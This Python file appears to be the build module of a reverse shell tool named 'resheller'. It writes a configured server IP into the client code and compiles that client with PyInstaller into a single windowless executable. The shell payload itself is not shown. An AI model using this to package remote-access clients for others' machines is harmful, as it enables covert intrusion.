#!/usr/bin/env python3
"""build"""
from configparser import ConfigParser
from ipaddress import IPv4Address
from os import path, name, rename
from shutil import copyfile
from subprocess import call, DEVNULL

from root_finder import get_project_root

from lib.stdout import COLOR


class Build:
    """Call to resolve config paths and create uninitiated configs"""

    def __init__(self, args) -> None:
        self.repo = get_project_root("resheller")
        self.config = path.join(self.repo, "config.ini")
        self.package = path.join(self.repo, "resheller")
        self.stdout = None if args.verbose else DEVNULL

    def write_ip_py(self, ipv4: str) -> None:
        """Write importable module with data taken from the `config.ini` file

        :param ipv4: IP of target host or instruction to add IP
        """
        ip_py = path.join(self.package, "src", "client", "ip.py")
        docstring = """This IP will be compiled into client executable"""
        with open(ip_py, "w") as file:
            file.write("#!/usr/bin/env python3\n")
            file.write('"""resheller.src.client.ip"""\n\n\n')
            file.write("def get_ip():\n")
            file.write(f"    {docstring}\n")
            file.write(f"    return {ipv4}\n")

    def make_config(self) -> None:
        """Copy a new `config.ini` file from default template, `default.ini`"""
        default = path.join(self.package, "lib", "default.ini")
        copyfile(default, self.config)

    def parse_config(self) -> str:
        """Read IP address from the `config.ini` file

        :return: Configured IP address
        """
        config = ConfigParser()
        config.read(self.config)
        return config["IP"]["server"]

    @staticmethod
    def verify_ipv4(ipv4: str) -> bool:
        """Ensure IP address is a valid IPv4 address

        :param ipv4: Configured IP address
        """
        try:
            IPv4Address(ipv4.strip('"'))
            return True
        except ValueError as err:
            if "Enter target IP here" in ipv4:
                COLOR.red.print("Enter target's IP in the `config.ini` file")
            else:
                COLOR.b_red.print(f"Not a valid IPv4 Address\n   {err}")
            return False

    def make_exe(self) -> int:
        """Run Pyinstaller to build reverse shell client executable

        :return: Exit code for successful/unsuccessful build
        """
        client_py = path.join(self.package, "client.py")
        cmd = f"pyinstaller --onefile --noconsole {client_py}"
        return call(cmd, stdout=self.stdout, stderr=self.stdout, shell=True)

    def move_client(self) -> None:
        """Move client executable to repo root before removing the
        build artifacts
        """
        client_exe = "client.exe" if name == "nt" else "client"
        client_src = path.join(self.repo, "dist", client_exe)
        client_dst = path.join(self.repo, client_exe)
        rename(client_src, client_dst)
